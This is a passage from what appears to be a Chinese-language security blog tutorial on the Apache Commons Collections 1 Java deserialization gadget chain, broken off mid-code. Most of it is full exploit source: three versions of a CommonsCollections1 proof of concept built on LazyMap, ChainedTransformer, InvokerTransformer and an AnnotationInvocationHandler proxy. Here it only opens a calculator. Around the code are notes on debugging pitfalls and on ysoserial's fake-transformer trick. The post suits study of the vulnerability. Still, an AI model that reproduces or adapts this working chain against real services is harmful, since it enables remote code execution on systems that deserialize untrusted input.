class_">HashMap</span>&lt;&gt;());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        proxyMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220922232016142.png" alt="image-20220922232016142"></p><p>从结果中可以看到，动态代理的对象执行方法的时候，转发到了实现接口<code>InvocationHandler</code>的<code>Demo</code>类里并执行<code>invoke()</code>方法，把我们存储的值<code>admin</code>改成了<code>dotast</code>，并打印出<code>success</code>字符串。</p><p>而<code>AnnotationInvocationHandler</code>类正好是实现了<code>InvocationHandler</code>接口的类，因此我们可以通过动态代理的方式去调用到<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="images/image-20220922232441082.png" alt="image-20220922232441082"></p><p>因此我们可以写出初步的 POC：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(proxyMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>但运行后，经过反序列化并不会执行命令弹出计算器。断点调试一下，发现<code>memberValues</code>变量的赋值为<code>LazyMap</code><br><img src="images/image-20220926111006320.png" alt="image-20220926111006320"></p><p>因此在经过<code>this.memberValues.entrySet().iterator();</code>步入到<code>var4.next()</code>执行方法时，无法进入<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法<br><img src="images/image-20220926111405695.png" alt="image-20220926111405695"></p><p>所以我们需要再创建一次<code>AnnotationInvocationHandler</code>，触发我们前面的代理对象，最终 POC如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220926150336993.png" alt="image-20220926150336993"></p><p>通过把前面的<code>proxyMap</code>作为构造方法的参数传入，此时的<code>memberValues</code>为我们的代理对象<code>proxyMap</code>，也就是<code>AnnotationInvocationHandler</code>实例<br><img src="images/image-20220926150831689.png" alt="image-20220926150831689"></p><p>经过<code>this.memberValues.entrySet()</code>步入到<code>var4.next()</code>之后，成功进入到被代理的<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法中。</p><p>此时的<code>memberValues</code>参数值就是前面第一次代理的时候的<code>LazyMap</code>，因此可以调用到<code>LazyMap.get()</code>方法，触发命令执行。<br><img src="images/image-20220926151146196.png" alt="image-20220926151146196"></p><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>在前面调试的时候，在未进入<code>readObject()</code>反序列化方法时，就弹出了计算器，原因是在第一次代理了<code>map</code>对象后，在执行<code>map</code>类的任意方法都会触发构造的<code>payload</code>，而由于<code>IDEA</code>中<code>Debug</code>的过程中会调用到代理类的<code>toString</code>方法从而造成非预期的命令执行。</p><p>解决方案是取消掉这两处的✅<br><img src="images/image-20220926151832327.png" alt="image-20220926151832327"></p><p>当前也可以参照<code>ysoserial</code>的处理<br><img src="images/image-20221005001535438.png" alt="image-20221005001535438"></p><p>先在开头设置一个没有危害的对象，在最后进行序列化的时候再把真正具有危害的<code>transformers</code>数组替换，从而避免了非预期的 rce<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/19 22:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections1</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections1</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span 